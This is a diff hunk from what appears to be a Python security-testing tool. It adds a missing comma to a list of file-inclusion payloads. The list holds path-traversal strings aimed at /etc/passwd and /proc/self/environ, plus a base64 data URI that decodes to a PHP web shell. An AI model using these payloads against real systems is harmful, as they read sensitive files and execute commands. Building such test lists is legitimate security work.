@@ -227,7 +227,7 @@ VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
             "/proc/self/environ",
             "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
             "file:///etc/passwd",
-            "C:\\win.ini"
+            "C:\\win.ini",
             "/?../../../../../../../etc/passwd"
         ]
     },
